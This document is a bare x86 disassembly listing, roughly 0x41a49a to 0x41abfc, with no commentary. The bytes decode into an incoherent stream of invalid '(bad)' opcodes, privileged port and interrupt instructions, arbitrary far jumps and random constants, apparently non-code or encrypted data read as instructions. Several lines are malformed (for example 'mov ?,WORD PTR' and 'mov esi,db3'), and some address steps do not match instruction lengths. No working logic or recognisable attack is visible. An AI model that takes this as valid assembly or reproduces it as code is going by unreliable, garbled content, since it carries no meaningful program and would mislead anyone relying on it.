  41a49a:	sub    DWORD PTR [edx],edi
  41a49c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a49d:	push   0x72e356d0
  41a4a2:	out    0x1b,al
  41a4a4:	pusha  
  41a4a5:	in     eax,dx
  41a4a6:	cli    
  41a4a7:	push   ecx
  41a4a8:	lea    ebx,[ebx-0x45bfc6c1]
  41a4ae:	mov    eax,0x2f918cdd
  41a4b3:	cld    
  41a4b4:	ficom  DWORD PTR [ebp-0x52]
  41a4b7:	loopne 0x41a4f4
  41a4b9:	(bad)  
  41a4ba:	fwait
  41a4bb:	mov    eax,0x4b3a16f8
  41a4c0:	push   ecx
  41a4c1:	cdq    
  41a4c2:	icebp  
  41a4c3:	mov    esp,0xf3d98d18
  41a4c8:	aaa    
  41a4c9:	push   ebp
  41a4ca:	adc    BYTE PTR [ebp+0x6a],bh
  41a4cd:	jecxz  0x41a4c0
  41a4cf:	jecxz  0x41a464
  41a4d1:	cmp    BYTE PTR [ebx],0x84
  41a4d4:	inc    ebp
  41a4d5:	jg     0x41a47d
  41a4d7:	inc    esi
  41a4d8:	jge    0x41a557
  41a4da:	call   0x7541ff08
  41a4df:	xchg   ebp,eax
  41a4e0:	loop   0x41a489
  41a4e2:	fstp   TBYTE PTR [ecx-0x6496fab0]
  41a4e8:	sbb    cl,BYTE PTR [eax+0x2bfc9749]
  41a4ee:	or     dl,ch
  41a4f0:	or     BYTE PTR [ecx],0x40
  41a4f3:	jnp    0x41a532
  41a4f5:	or     DWORD PTR [edx],eax
  41a4f7:	outs   dx,DWORD PTR ds:[esi]
  41a4f8:	push   edx
  41a4f9:	sbb    bh,dl
  41a4fb:	sbb    DWORD PTR [edi+0x4be1e399],esp
  41a501:	aas    
  41a502:	test   BYTE PTR [edx],bh
  41a504:	push   es
  41a505:	and    DWORD PTR [esi+0x235b5d65],eax
  41a50b:	ins    DWORD PTR es:[edi],dx
  41a50c:	fld    DWORD PTR [ebp+ebp*8-0x26]
  41a510:	push   cs
  41a511:	mov    dl,BYTE PTR [ebx]
  41a513:	push   ds
  41a514:	lods   al,BYTE PTR ds:[esi]
  41a515:	xor    al,0xbf
  41a517:	jnp    0x41a56f
  41a519:	rcl    DWORD PTR [edi-0x5b],cl
  41a51c:	and    bh,bl
  41a51e:	add    ah,BYTE PTR [ebx+0x20290601]
  41a524:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a525:	aad    0x6a
  41a527:	loope  0x41a512
  41a529:	cmc    
  41a52a:	call   0x1ef77fce
  41a52f:	mov    ch,0x3e
  41a531:	jmp    0x384b:0xd1044fcc
  41a538:	(bad)  
  41a539:	mov    esp,0xd4f0af5a
  41a53e:	loop   0x41a5a4
  41a540:	pop    edi
  41a541:	pop    ds
  41a542:	jmp    0x1409:0x2481ca31
  41a549:	mov    DWORD PTR [esp+ecx*2+0x6e2a3de5],ebp
  41a550:	mov    edx,0xc0b6c237
  41a555:	push   0x4248eb1c
  41a55a:	sbb    dl,BYTE PTR [edx-0x71084b64]
  41a560:	bound  eax,QWORD PTR [esi]
  41a562:	mov    BYTE PTR [ebx-0x26],ah
  41a565:	sti    
  41a566:	pop    eax
  41a567:	sub    eax,0x8a3cbec0
  41a56c:	retf   0xb573
  41a56f:	pop    esp
  41a570:	fs xchg ecx,eax
  41a572:	js     0x41a55f
  41a574:	shr    dh,1
  41a576:	aaa    
  41a577:	jecxz  0x41a53c
  41a579:	jecxz  0x41a5f2
  41a57b:	or     dh,ch
  41a57d:	outs   dx,DWORD PTR ds:[esi]
  41a57e:	jle    0x41a5b5
  41a580:	jmp    0x839b:0xef5c1513
  41a587:	pushf  
  41a588:	sar    ebx,0xd8
  41a58b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a58c:	scas   al,BYTE PTR es:[edi]
  41a58d:	scas   al,BYTE PTR es:[edi]
  41a58e:	fdiv   st,st(4)
  41a590:	(bad)  
  41a591:	mov    esp,0x642fc840
  41a596:	push   eax
  41a597:	mov    cl,0xe6
  41a599:	shl    BYTE PTR [ebx],cl
  41a59b:	and    esp,DWORD PTR [edx-0x6b]
  41a59e:	stc    
  41a59f:	fisttp WORD PTR [edx+0x57]
  41a5a2:	lods   al,BYTE PTR ds:[esi]
  41a5a3:	push   esi
  41a5a4:	jmp    0xb0fc:0x6b42d8f1
  41a5ab:	cwde   
  41a5ac:	pop    esp
  41a5ad:	cmc    
  41a5ae:	adc    eax,0x82a47b99
  41a5b3:	cld    
  41a5b4:	mov    bl,0x92
  41a5b6:	adc    eax,0x50fed454
  41a5bb:	dec    ebp
  41a5bc:	fcomp  DWORD PTR [edx+0x2f]
  41a5bf:	dec    esi
  41a5c0:	scas   al,BYTE PTR es:[edi]
  41a5c1:	les    ebx,FWORD PTR [edx+0x34bdfc3e]
  41a5c7:	and    esp,DWORD PTR [edx]
  41a5c9:	imul   eax,edi,0x6bdd6944
  41a5cf:	add    cl,al
  41a5d1:	imul   eax,ebp,0xffffffd8
  41a5d4:	enter  0x36bb,0x2c
  41a5d8:	(bad)  
  41a5d9:	jle    0x41a56b
  41a5db:	or     dl,ch
  41a5dd:	sbb    edi,edx
  41a5df:	mov    ah,0x88
  41a5e1:	push   ss
  41a5e2:	and    al,0xb6
  41a5e4:	fwait
  41a5e5:	pop    esp
  41a5e6:	add    DWORD PTR [edi-0x16a0bb25],0x89d3f2e9
  41a5f0:	mov    esp,0xc8a1336
  41a5f5:	jno    0x41a57f
  41a5f7:	aam    0xed
  41a5f9:	cdq    
  41a5fa:	mov    ecx,0x19d8a9c6
  41a5ff:	loope  0x41a66f
  41a601:	cmp    ch,BYTE PTR [ebx-0x5e3d5d78]
  41a607:	sahf   
  41a608:	(bad)  
  41a609:	fcomp  DWORD PTR [esi-0x22]
  41a60c:	pop    eax
  41a60d:	out    0xb8,al
  41a60f:	inc    esp
  41a610:	outs   dx,DWORD PTR ds:[esi]
  41a611:	push   es
  41a612:	jmp    0x41a5ed
  41a614:	or     al,0x49
  41a617:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a618:	adc    BYTE PTR [edx-0x5e8c637a],ch
  41a61e:	jbe    0x41a5cf
  41a620:	pop    ecx
  41a621:	(bad)  
  41a623:	fld    TBYTE PTR [eax]
  41a625:	mov    DWORD PTR [esi],esp
  41a627:	(bad)  
  41a628:	leave  
  41a629:	mov    esi,0x2b066cc9
  41a62e:	pop    edi
  41a62f:	jecxz  0x41a677
  41a631:	jp     0x41a652
  41a633:	das    
  41a634:	enter  0xe540,0xa8
  41a638:	adc    BYTE PTR [eax+0x21],0xb2
  41a63c:	arpl   WORD PTR [esi],ax
  41a63e:	out    0x7,al
  41a640:	(bad)  
  41a642:	sar    BYTE PTR [eax-0x4b],0x33
  41a646:	popf   
  41a647:	daa    
  41a648:	scas   al,BYTE PTR es:[di]
  41a64a:	jg     0x41a674
  41a64c:	ret    0xab5f
  41a64f:	mov    cl,0x47
  41a651:	lea    ecx,[ecx-0x40]
  41a654:	xor    eax,0x33968004
  41a659:	dec    edx
  41a65a:	lods   al,BYTE PTR ds:[esi]
  41a65b:	xor    ebp,0xfffffff1
  41a65e:	inc    edi
  41a65f:	jge    0x41a6c9
  41a661:	cmp    eax,0x8a82963e
  41a666:	mov    ecx,0x698332e6
  41a66b:	pop    esi
  41a66c:	add    ecx,esp
  41a66e:	mov    esi,0xa0bbe519
  41a673:	mov    ecx,0x4ddfcf0b
  41a678:	fst    DWORD PTR [edx]
  41a67a:	pop    esi
  41a67b:	js     0x41a6d3
  41a67d:	hlt    
  41a67e:	cmp    al,0x5c
  41a680:	cmp    al,0x5b
  41a682:	mov    BYTE PTR [edi-0x6ce416f2],cl
  41a688:	pop    esi
  41a689:	adc    DWORD PTR [ebx+0x36a5199a],ebx
  41a68f:	add    ebx,DWORD PTR [ecx+ebx*1-0x521f772e]
  41a696:	daa    
  41a697:	arpl   WORD PTR [ebx],bp
  41a699:	test   DWORD PTR [edx],esi
  41a69b:	push   esp
  41a69c:	jbe    0x41a654
  41a69e:	sbb    eax,0xab1398d9
  41a6a3:	mov    ds:0x3318497c,al
  41a6a8:	mov    ds,edx
  41a6aa:	inc    eax
  41a6ab:	jp     0x41a692
  41a6ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a6ae:	jecxz  0x41a65e
  41a6b0:	loop   0x41a661
  41a6b2:	add    ebp,DWORD PTR [ebx+esi*2-0x490cb017]
  41a6b9:	dec    ebx
  41a6ba:	mov    al,0xa2
  41a6bc:	and    DWORD PTR fs:[eax],esp
  41a6bf:	pop    esp
  41a6c0:	jmp    0xf7a6:0x4d1d6834
  41a6c7:	xchg   edi,eax
  41a6c8:	scas   al,BYTE PTR es:[edi]
  41a6c9:	jmp    0x41a668
  41a6cb:	inc    eax
  41a6cc:	xchg   edx,eax
  41a6cd:	sbb    al,0x9e
  41a6cf:	mov    ss,WORD PTR [edi]
  41a6d1:	push   ecx
  41a6d2:	mov    bh,0x9f
  41a6d4:	xchg   ecx,eax
  41a6d5:	icebp  
  41a6d6:	xchg   ebp,eax
  41a6d7:	mov    al,0x69
  41a6d9:	mov    ch,0xda
  41a6db:	mov    al,ds:0x2779d5e
  41a6e0:	loopne 0x41a6f3
  41a6e2:	mov    eax,0x63ca59dd
  41a6e7:	fiadd  WORD PTR [eax-0x21]
  41a6ea:	test   al,0x3f
  41a6ec:	mov    ebx,0x686a237
  41a6f1:	push   0x63
  41a6f3:	(bad)  [edx+0x47]
  41a6f6:	js     0x41a67f
  41a6f8:	fiadd  DWORD PTR [esi-0x22]
  41a6fb:	arpl   WORD PTR [edx],bx
  41a6fd:	mov    al,BYTE PTR [eax]
  41a6ff:	cmc    
  41a700:	and    al,0x34
  41a702:	jbe    0x41a6ee
  41a704:	(bad)  
  41a705:	iret   
  41a706:	xchg   esp,eax
  41a707:	sbb    al,0x2d
  41a709:	lods   al,BYTE PTR ds:[esi]
  41a70a:	cli    
  41a70b:	repnz mov ah,0x7c
  41a70e:	dec    eax
  41a70f:	ss (bad) 
  41a711:	fmul   DWORD PTR [edx-0x4a]
  41a714:	stos   BYTE PTR es:[edi],al
  41a715:	adc    ecx,DWORD PTR [ebp-0x5787438b]
  41a71b:	pop    edi
  41a71c:	shr    BYTE PTR [ebp+0x3500fa44],1
  41a722:	push   esp
  41a723:	inc    ebp
  41a724:	clc    
  41a725:	cmp    DWORD PTR [ebp+esi*8-0x67368b0a],ecx
  41a72c:	sbb    eax,0xafb5ac1e
  41a731:	test   BYTE PTR [edx-0x52944bc5],bh
  41a737:	push   esi
  41a738:	lahf   
  41a739:	pusha  
  41a73a:	pop    edx
  41a73b:	lods   al,BYTE PTR ds:[esi]
  41a73c:	stos   DWORD PTR es:[edi],eax
  41a73d:	push   0xffffffa6
  41a73f:	sbb    ebp,edx
  41a741:	std    
  41a742:	fldenv [edx+0x679c2da]
  41a748:	add    ah,BYTE PTR [ebx-0x7c713565]
  41a74e:	fninit 
  41a750:	(bad)  
  41a751:	inc    ebx
  41a752:	in     eax,0x70
  41a754:	mov    bl,dl
  41a756:	or     eax,0x4443a409
  41a75b:	pop    ds
  41a75c:	clc    
  41a75d:	push   es
  41a75e:	xchg   ecx,eax
  41a75f:	xchg   ebx,eax
  41a760:	call   0x34e11c96
  41a765:	mov    ecx,0x78a9a4d1
  41a76a:	push   eax
  41a76b:	and    eax,0x1bf23d9f
  41a771:	jo     0x41a753
  41a773:	jbe    0x41a7b9
  41a775:	scas   eax,DWORD PTR es:[edi]
  41a776:	(bad)  
  41a777:	ins    BYTE PTR es:[edi],dx
  41a778:	fstp   TBYTE PTR [ecx]
  41a77a:	xor    DWORD PTR [esi-0x2bd4d882],ebx
  41a780:	push   esp
  41a781:	pop    edx
  41a782:	cmp    edx,DWORD PTR [edx]
  41a784:	out    dx,eax
  41a785:	mov    ds:0x926675dc,eax
  41a78a:	(bad)  
  41a78b:	into   
  41a78c:	call   0x23f92830
  41a791:	mov    ds:0x7221fa99,al
  41a796:	outs   dx,BYTE PTR ds:[esi]
  41a797:	and    eax,0x8809431c
  41a79c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a79d:	aaa    
  41a79e:	ins    DWORD PTR es:[edi],dx
  41a79f:	rcl    DWORD PTR [eax-0x4856c947],1
  41a7a5:	jno    0x41a811
  41a7a7:	mov    eax,DWORD PTR [edx-0x1bfdba95]
  41a7ad:	loopne 0x41a81c
  41a7af:	mov    BYTE PTR [edi],ah
  41a7b1:	mov    edi,0xd11ea8ac
  41a7b6:	loop   0x41a73d
  41a7b8:	ficomp DWORD PTR [ecx+0x1c]
  41a7bb:	aam    0xec
  41a7bd:	loop   0x41a7e8
  41a7bf:	(bad)  
  41a7c0:	mov    edx,0xc25ace40
  41a7c5:	shl    DWORD PTR [edi],0xb6
  41a7c8:	mov    ?,WORD PTR [eax-0x24]
  41a7cb:	loopne 0x41a7c3
  41a7cd:	rcl    BYTE PTR [esi-0x41],cl
  41a7d0:	mov    dh,0x84
  41a7d2:	es loop 0x41a846
  41a7d5:	lock and DWORD PTR [edi-0x57f016db],0xfffffff4
  41a7dd:	lock clc 
  41a7df:	mov    ds:0xd10ac5a4,eax
  41a7e4:	ror    edx,0x89
  41a7e7:	call   0xe4cd:0x2c7e3c7f
  41a7ee:	loopne 0x41a82d
  41a7f0:	mov    edi,0x46e8cdb4
  41a7f5:	nop
  41a7f6:	js     0x41a78d
  41a7f8:	push   ss
  41a7f9:	jbe    0x41a867
  41a7fb:	jmp    0x4fa8:0x30e64862
  41a802:	stos   DWORD PTR es:[edi],eax
  41a803:	repnz test eax,0x94446232
  41a809:	neg    DWORD PTR [eax-0x63]
  41a80c:	fst    st(2)
  41a80e:	pop    edi
  41a80f:	add    bl,BYTE PTR ds:0x983ba4b9
  41a815:	les    edi,FWORD PTR [edi+0x5a]
  41a818:	ret    
  41a819:	sbb    eax,0x856c042d
  41a81e:	(bad)  
  41a81f:	push   edx
  41a820:	sub    DWORD PTR [edx],esi
  41a822:	popf   
  41a823:	push   ebx
  41a824:	xor    al,0xec
  41a826:	inc    eax
  41a827:	jmp    0x37e77793
  41a82c:	mov    al,ds:0xa6b3bef3
  41a831:	outs   dx,BYTE PTR ds:[esi]
  41a832:	imul   esp,DWORD PTR [ebp+0x6842dd65],0x6c
  41a839:	das    
  41a83a:	aad    0x40
  41a83c:	inc    esp
  41a83d:	push   ss
  41a83e:	and    bh,BYTE PTR [eax+0x22029899]
  41a844:	pop    esp
  41a845:	scas   al,BYTE PTR es:[edi]
  41a846:	push   eax
  41a847:	xor    BYTE PTR [esi-0x7306e0e9],bl
  41a84d:	pop    eax
  41a84e:	es pop edx
  41a850:	jnp    0x41a8a0
  41a852:	jge    0x41a82c
  41a854:	sti    
  41a855:	sub    ah,0xdf
  41a858:	xchg   BYTE PTR [ebx],dh
  41a85a:	loope  0x41a87f
  41a85c:	mov    dh,0xe
  41a85e:	xor    al,0xb
  41a860:	sti    
  41a861:	xchg   eax,esi
  41a863:	jecxz  0x41a853
  41a865:	sar    DWORD PTR [esi+0x5],cl
  41a868:	xchg   eax,edi
  41a86a:	jns    0x41a86e
  41a86c:	rol    DWORD PTR [eax-0x1b78e041],cl
  41a872:	cmc    
  41a873:	lods   al,BYTE PTR ds:[esi]
  41a874:	aaa    
  41a875:	rcr    eax,0xbb
  41a878:	pop    edi
  41a879:	sub    al,ah
  41a87b:	les    ebx,FWORD PTR [edx]
  41a87d:	shl    DWORD PTR [edi-0xe],0xe
  41a881:	sbb    DWORD PTR [edx+0x1b],ebx
  41a884:	ins    DWORD PTR es:[edi],dx
  41a885:	and    edi,ebx
  41a887:	jno    0x41a8e4
  41a889:	aad    0x76
  41a88b:	call   0x77f6415f
  41a890:	mov    dh,0x24
  41a892:	lds    ebp,FWORD PTR [ebx-0x3b2846c0]
  41a898:	mov    ah,0x6b
  41a89a:	mov    edx,0xc77b4502
  41a89f:	and    eax,0xff31491a
  41a8a4:	repz xor bl,BYTE PTR [esi]
  41a8a7:	fwait
  41a8a8:	jno    0x41a8d3
  41a8aa:	popa   
  41a8ab:	sub    ch,BYTE PTR [ebp+0x365ce431]
  41a8b1:	es aam 0xd9
  41a8b4:	push   cs
  41a8b5:	test   eax,0xac01411d
  41a8ba:	not    DWORD PTR [ecx-0x30]
  41a8bd:	and    ebx,DWORD PTR [ebp-0x78]
  41a8c0:	fwait
  41a8c1:	ds mov dh,bh
  41a8c4:	xor    BYTE PTR [edx+0x4596253],bl
  41a8ca:	js     0x41a86f
  41a8cc:	jmp    0x25f2876
  41a8d1:	out    dx,al
  41a8d2:	icebp  
  41a8d3:	outs   dx,DWORD PTR ds:[esi]
  41a8d4:	and    BYTE PTR [edi+eax*4+0x2bd4d],ch
  41a8db:	pusha  
  41a8dc:	push   edi
  41a8dd:	pop    esp
  41a8de:	cmp    ah,bh
  41a8e0:	jmp    0x41a8c0
  41a8e2:	cmp    al,0x50
  41a8e4:	sbb    ch,BYTE PTR [ecx-0x2a]
  41a8e7:	push   0xadd3694c
  41a8ec:	shr    DWORD PTR [ebp+0x30],1
  41a8ef:	xor    al,0x69
  41a8f1:	clc    
  41a8f2:	scas   al,BYTE PTR es:[edi]
  41a8f3:	hlt    
  41a8f4:	sar    DWORD PTR [eax-0x4],1
  41a8f7:	retf   
  41a8f8:	add    ah,0xa3
  41a8fb:	mov    ch,0x19
  41a8fd:	cmc    
  41a8fe:	jne    0x41a8a5
  41a900:	pushf  
  41a901:	push   ecx
  41a902:	mov    edi,0xecff5d48
  41a907:	ret    
  41a908:	jb     0x41a936
  41a90a:	(bad)  
  41a90b:	daa    
  41a90c:	and    edi,esi
  41a90e:	fmul   st(2),st
  41a910:	sub    BYTE PTR [edi],dh
  41a912:	scas   eax,DWORD PTR es:[edi]
  41a913:	xchg   ebx,eax
  41a914:	inc    ebx
  41a915:	imul   eax,edx,0xe41b6f99
  41a91b:	mov    eax,0x54a98ba8
  41a920:	cli    
  41a921:	sbb    eax,0xee435d05
  41a926:	das    
  41a927:	jo     0x41a8bf
  41a929:	inc    eax
  41a92a:	inc    esi
  41a92b:	jecxz  0x41a926
  41a92d:	shl    esi,0xdf
  41a930:	and    BYTE PTR [edx],0xb
  41a933:	fsub   DWORD PTR [edi]
  41a935:	xchg   ebp,eax
  41a936:	mov    esp,esp
  41a938:	je     0x41a8ff
  41a93a:	ins    BYTE PTR es:[edi],dx
  41a93b:	je     0x41a8f5
  41a93d:	or     al,0x8
  41a93f:	dec    ebp
  41a940:	loop   0x41a8ce
  41a942:	xchg   ebx,eax
  41a943:	out    dx,al
  41a944:	push   ss
  41a945:	mov    esi,db3
  41a948:	pop    dx
  41a94a:	retf   0x92f5
  41a94d:	shr    DWORD PTR [edx],0xb8
  41a950:	fld    DWORD PTR [esi+eax*4]
  41a953:	aad    0x60
  41a955:	adc    eax,DWORD PTR [ecx+esi*4-0x1f]
  41a959:	jbe    0x41a9c8
  41a95b:	push   0xed88edbe
  41a960:	rol    DWORD PTR [ebx],1
  41a962:	mov    bh,0x20
  41a964:	fcmovne st,st(1)
  41a966:	pop    ss
  41a967:	dec    ebx
  41a968:	stc    
  41a969:	mov    dl,BYTE PTR [ecx-0x11]
  41a96c:	in     eax,dx
  41a96d:	or     esi,DWORD PTR [ebx]
  41a96f:	jl     0x41a8fd
  41a971:	int    0x6e
  41a973:	addr16 mov ebp,0xf85d27d8
  41a979:	shl    DWORD PTR [ebx+esi*4-0x3f],1
  41a97d:	mov    WORD PTR [ebx],cs
  41a97f:	cmp    cl,BYTE PTR ds:0xdb747738
  41a985:	test   al,dh
  41a987:	jl     0x41a999
  41a989:	imul   ebp,DWORD PTR [ecx-0x6a],0xffffffd1
  41a98d:	mov    dl,0xa7
  41a98f:	stos   DWORD PTR es:[edi],eax
  41a990:	pop    ebp
  41a991:	lahf   
  41a992:	std    
  41a993:	dec    esi
  41a994:	cmp    bh,BYTE PTR [esi]
  41a996:	or     al,cl
  41a998:	sbb    eax,0x690187e
  41a99d:	lahf   
  41a99e:	lods   eax,DWORD PTR ds:[esi]
  41a99f:	xor    eax,0x901ada96
  41a9a4:	xor    ebp,DWORD PTR [ebp+0x64]
  41a9a7:	push   ds
  41a9a8:	pop    ds
  41a9a9:	bound  edx,QWORD PTR [ecx]
  41a9ab:	enter  0xc892,0xfb
  41a9af:	or     eax,0x44de4afe
  41a9b4:	lods   eax,DWORD PTR ds:[esi]
  41a9b5:	mov    edx,0xaac3578b
  41a9ba:	fucomp st(1)
  41a9bc:	sbb    BYTE PTR fs:[esi-0x6cad5b04],0xbf
  41a9c4:	mov    edi,0x86245567
  41a9c9:	bsr    edi,DWORD PTR [ebp+0x59]
  41a9cd:	push   ss
  41a9ce:	jb     0x41a9bc
  41a9d0:	adc    al,0x73
  41a9d2:	pop    ecx
  41a9d3:	into   
  41a9d4:	loop   0x41a993
  41a9d6:	repz sub BYTE PTR [ecx-0x69],ch
  41a9da:	mov    gs,WORD PTR [ebp+0x22aa5c1c]
  41a9e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a9e1:	lods   al,BYTE PTR ds:[esi]
  41a9e2:	xchg   esp,eax
  41a9e3:	mov    esp,0x3808ac9a
  41a9e8:	mov    dl,0x1
  41a9ea:	aad    0x22
  41a9ec:	xchg   esi,eax
  41a9ed:	scas   eax,DWORD PTR es:[edi]
  41a9ee:	cmp    DWORD PTR ds:0x49d4284f,eax
  41a9f4:	push   0xffffff91
  41a9f6:	shl    esi,0x6d
  41a9f9:	mov    al,0xc7
  41a9fb:	in     al,0x98
  41a9fd:	pop    eax
  41a9fe:	cwde   
  41a9ff:	int3   
  41aa00:	pop    ecx
  41aa01:	into   
  41aa02:	test   al,0x75
  41aa04:	jnp    0x41aa1f
  41aa06:	mov    ebx,0xa7881005
  41aa0b:	gs scas al,BYTE PTR es:[edi]
  41aa0d:	pmuludq mm1,mm5
  41aa10:	pop    esp
  41aa11:	sbb    BYTE PTR [ebx],ah
  41aa13:	mov    ah,dl
  41aa15:	inc    ebx
  41aa16:	pop    ebx
  41aa17:	mov    ebp,?
  41aa19:	int3   
  41aa1a:	xchg   bh,bl
  41aa1c:	stos   DWORD PTR es:[edi],eax
  41aa1d:	lock call 0x6da5:0x44ccbe1
  41aa25:	fsubr  QWORD PTR [ecx]
  41aa27:	and    edi,ebp
  41aa29:	jb     0x41aa34
  41aa2b:	lds    edi,FWORD PTR [esi-0x2e]
  41aa2e:	mov    bl,0x4
  41aa30:	push   0x6f0b5d34
  41aa35:	jge    0x41a9c1
  41aa37:	into   
  41aa38:	or     eax,DWORD PTR [ebp-0x42cac5d8]
  41aa3e:	jb     0x41aa64
  41aa40:	mov    esi,?
  41aa42:	dec    DWORD PTR [ebx]
  41aa44:	cdq    
  41aa45:	mov    BYTE PTR [ebp-0x5ea14f7],bl
  41aa4b:	nop
  41aa4c:	stos   DWORD PTR es:[edi],eax
  41aa4d:	push   eax
  41aa4e:	fwait
  41aa4f:	sbb    al,0x3
  41aa51:	mov    ebx,0xb8fb7de8
  41aa56:	dec    ecx
  41aa57:	sbb    eax,esp
  41aa59:	shl    cl,cl
  41aa5b:	imul   esi,edx,0x6beaf4d7
  41aa61:	cmp    cl,BYTE PTR [ebx+0x23]
  41aa64:	pusha  
  41aa65:	(bad)  
  41aa66:	push   edi
  41aa67:	aam    0xa6
  41aa69:	add    BYTE PTR ds:0x253b6fba,dl
  41aa6f:	lock pop esp
  41aa71:	mov    ebx,0x42d474ca
  41aa76:	adc    al,0x4f
  41aa78:	push   0x5394174a
  41aa7d:	addr16 mov bl,0xdc
  41aa80:	(bad)  
  41aa81:	cmp    BYTE PTR [ebp*1-0x514fa70d],cl
  41aa88:	cmp    BYTE PTR [ecx],ch
  41aa8a:	out    dx,eax
  41aa8b:	data16 mov bl,0xb1
  41aa8e:	cmp    eax,0xf31990ca
  41aa93:	mov    dl,0xfe
  41aa95:	sub    ecx,ebp
  41aa97:	sahf   
  41aa98:	push   eax
  41aa99:	mov    ah,0xbf
  41aa9b:	xchg   ebp,eax
  41aa9c:	push   esi
  41aa9d:	xchg   esi,eax
  41aa9e:	mov    WORD PTR gs:[esi-0x22],fs
  41aaa2:	shl    DWORD PTR [ebp+0x1989a637],1
  41aaa8:	repz in eax,0xa5
  41aaab:	les    ebp,FWORD PTR [esi-0x5b504416]
  41aab1:	sbb    al,BYTE PTR [edi-0x20409df9]
  41aab7:	stos   DWORD PTR es:[edi],eax
  41aab8:	mov    al,ds:0x88f003d3
  41aabd:	popf   
  41aabe:	jae    0x41aaa9
  41aac0:	pop    ss
  41aac1:	ss stos BYTE PTR es:[edi],al
  41aac3:	inc    esp
  41aac4:	int3   
  41aac5:	xchg   edx,eax
  41aac6:	and    BYTE PTR [ebp-0x78],dh
  41aac9:	jo     0x41aadb
  41aacb:	int    0xea
  41aacd:	pop    esi
  41aace:	inc    ebx
  41aacf:	aaa    
  41aad0:	pop    ecx
  41aad1:	or     eax,0xeb185916
  41aad6:	je     0x41aa78
  41aad8:	test   eax,0x77500c9b
  41aadd:	mov    esp,0x35d32d19
  41aae2:	inc    edi
  41aae3:	(bad)
  41aae7:	pop    esp
  41aae8:	fdivr  st,st(4)
  41aaea:	rcl    BYTE PTR ds:0xe1a5ceaa,1
  41aaf0:	pop    edi
  41aaf1:	push   esi
  41aaf2:	push   ecx
  41aaf3:	pop    eax
  41aaf4:	int3   
  41aaf5:	jg     0x41aa8a
  41aaf7:	jecxz  0x41ab53
  41aaf9:	outs   dx,BYTE PTR ds:[esi]
  41aafa:	push   esi
  41aafb:	fwait
  41aafc:	fwait
  41aafd:	js     0x41ab7d
  41aaff:	aas    
  41ab00:	loopne 0x41ab71
  41ab02:	and    eax,0xcdbd3600
  41ab07:	call   DWORD PTR [ebx+ebp*4+0x3562623]
  41ab0e:	in     eax,0xf2
  41ab10:	rcl    DWORD PTR [edx-0x4d],cl
  41ab13:	(bad)  
  41ab15:	jmp    0x41aa9c
  41ab17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ab18:	rol    DWORD PTR [eax],cl
  41ab1a:	adc    eax,0xfe2ac8c
  41ab1f:	jnp    0x41ab9d
  41ab21:	mov    ds:0xcba1d6de,al
  41ab26:	dec    edi
  41ab27:	push   0xffffff97
  41ab29:	mov    eax,fs:0x587e0c8
  41ab2f:	mov    dl,BYTE PTR [eax+edx*1+0x36]
  41ab33:	and    eax,0x6c879bc3
  41ab38:	or     DWORD PTR [ecx+edi*4+0x416c4d96],eax
  41ab3f:	gs push ss
  41ab41:	hlt    
  41ab42:	(bad)  
  41ab44:	push   ebx
  41ab45:	jg     0x41aaf4
  41ab47:	or     BYTE PTR [eax],0xdc
  41ab4a:	test   DWORD PTR [ebp+0x0],0x9b38360d
  41ab51:	js     0x41ab8c
  41ab53:	outs   dx,DWORD PTR ds:[esi]
  41ab54:	mul    BYTE PTR [esi-0x29]
  41ab57:	lds    esi,FWORD PTR [esp+edi*2+0x31]
  41ab5b:	popa   
  41ab5c:	add    al,0xb0
  41ab5e:	sbb    BYTE PTR [ebx],cl
  41ab60:	ins    DWORD PTR es:[edi],dx
  41ab61:	sbb    bl,dl
  41ab63:	repnz xor bh,dh
  41ab66:	stos   BYTE PTR es:[edi],al
  41ab67:	cld    
  41ab68:	sub    DWORD PTR [edi-0x70],edx
  41ab6b:	xor    eax,0xcb4ce165
  41ab70:	mov    al,0xd6
  41ab72:	test   BYTE PTR [eax-0x6c66ee73],bl
  41ab78:	mov    esp,0xcc0b2fff
  41ab7d:	xchg   ecx,eax
  41ab7e:	cld    
  41ab7f:	dec    ebx
  41ab80:	cwde   
  41ab81:	scas   eax,DWORD PTR es:[edi]
  41ab82:	cdq    
  41ab83:	out    dx,al
  41ab84:	cdq    
  41ab85:	cmp    BYTE PTR [edi],ah
  41ab87:	push   ecx
  41ab88:	in     al,0x55
  41ab8a:	popa   
  41ab8b:	aas    
  41ab8c:	fwait
  41ab8d:	mov    ecx,0x236806a2
  41ab92:	add    al,BYTE PTR ds:0x509e1065
  41ab98:	in     al,0x98
  41ab9a:	jno    0x41ab30
  41ab9c:	ins    DWORD PTR es:[edi],dx
  41ab9d:	jle    0x41ab41
  41ab9f:	hlt    
  41aba0:	(bad)  
  41aba1:	(bad)  
  41aba2:	xchg   esp,eax
  41aba3:	mov    edi,0x741f5c8e
  41aba8:	leave  
  41aba9:	inc    edi
  41abab:	cmp    eax,0x811aaabd
  41abb0:	jge    0x41abef
  41abb2:	cmp    cl,BYTE PTR [eax+0x2eebcd17]
  41abb8:	mov    ds:0x7d7339aa,eax
  41abbd:	mov    ah,0xd3
  41abbf:	gs inc ebp
  41abc1:	pop    esp
  41abc2:	or     BYTE PTR [di-0xc],ah
  41abc6:	aaa    
  41abc7:	data16 loopne 0x41ab94
  41abca:	and    BYTE PTR [edi+0x11caf9f3],ah
  41abd0:	push   cs
  41abd1:	(bad)  
  41abd2:	stos   DWORD PTR es:[edi],eax
  41abd3:	sahf   
  41abd4:	push   0xffffffcf
  41abd6:	daa    
  41abd7:	mov    edx,0x6d88d93b
  41abdc:	or     eax,0x95bd3c9d
  41abe1:	bound  edx,QWORD PTR [edi]
  41abe3:	add    eax,edi
  41abe5:	outs   dx,BYTE PTR ds:[esi]
  41abe6:	sbb    dh,BYTE PTR [esi]
  41abe8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41abe9:	mov    eax,ds:0x5dc6f22d
  41abee:	test   DWORD PTR [edx],edi
  41abf0:	add    edi,esi
  41abf2:	lock mov esp,0xf9578716
  41abf8:	ins    DWORD PTR es:[edi],dx
  41abf9:	xchg   ecx,eax
  41abfa:	rol    ebx,cl
  41abfc:	sub    eax,0xf5a3f7db
